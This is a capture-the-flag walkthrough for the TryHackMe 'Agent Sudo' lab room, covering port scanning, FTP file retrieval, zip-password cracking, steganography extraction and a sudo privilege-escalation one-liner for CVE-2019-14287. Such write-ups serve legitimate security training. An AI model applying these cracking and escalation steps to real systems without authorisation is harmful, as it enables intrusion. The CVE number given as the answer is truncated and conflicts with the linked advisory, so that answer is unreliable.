

# Agent Sudo

room：https://tryhackme.com/room/agentsudoctf

### 1.Enumerate

1.nmap and gobuster

```
nmap -sC -sV(-sS -sV) MACHINE_IP
gobuster dir -u MACHINE_IP  -w /usr/share/wordlists/dirb/common.txt -t 50 
```

How many open ports?

```
3
```

How you redirect yourself to a secret page?

```
user-agent
```

![image-20221127152826263](https://user-images.githubusercontent.com/115979342/204274189-41ca161b-fe7b-4494-bdca-5f36dc76ddfd.png)
What is the agent name?

```
chris
```



### 2.Hash cracking and brute-force

FTP password

<img width="912" alt="image-20221127152929563" src="https://user-images.githubusercontent.com/115979342/204274238-80c704aa-4ff9-493e-b5a7-b6d74ca6f87f.png">

```
*
```

use ftp login to get file

![image-20221127152956848](https://user-images.githubusercontent.com/115979342/204274268-4dfc6d95-3499-4f2d-a031-d4d03ed1f228.png)

```bash
mget *
```

To_agentJ.txt useful message:

```bash
root@aoiri:~/tryhackme/agentsudo# cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

use binwalk

![image-20221127153116310](https://user-images.githubusercontent.com/115979342/204274540-25e1e0ab-7db0-4922-bc66-03b3eeee9339.png)


```
binwalk cutie.png -e
```

get the zip file and use zip2john crack the zip pasword:

![image-20221127153312804](https://user-images.githubusercontent.com/115979342/204274647-039a3996-e848-4974-abab-5e1576008a04.png)

```bash
zip2john 8702.zip > zip.hash
john zip.hash

```


Zip file password

```
*
```

steg password

txt file has the encrypted string "QXJlYTUx"

use magic in [CyberChef](https://gchq.github.io/CyberChef/)


```
*
```

Who is the other agent (in full name)?

```bash
steghide extract -sf cute-alien.jpg 
```


```bash
root@aoiri:~/tryhackme/agentsudo/tmp# cat message.txt 
Hi james,

Glad you find this message. Your login password is ************

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
root@aoiri:~/tryhackme/agentsudo/tmp#
```

```
james
```

SSH password

```
************
```

use ssh login

### 3.Capture the user flag

just cat.

What is the user flag?

```
*
```

What is the incident of the photo called?

`sudo scp james@10.10.235.17:Alien_autospy.jpg ~/`

Reverse image and Foxnews.

```
Roswell alien autopsy
```



### 4.Privilege escalation


CVE number for the escalation  (Format: CVE-xxxx-xxxx)

use `sudo -l`


use bash shell in gtfbins they are not working.

![image-20221128111812736](https://user-images.githubusercontent.com/115979342/204274988-fa21482a-7f1a-4c82-bc8c-9af4d6cb6fb8.png)

search on google about exploit

https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulner

find it's sudo1.8.27 exploit

```
CVE-2019-1428
```

What is the root flag?

https://www.exploit-db.com/exploits/47502

use this to Privilege escalation

```
sudo -u#-1 /bin/bash
```

cat flag:

```
*
```

(Bonus) Who is Agent R?

```
Des...
```





























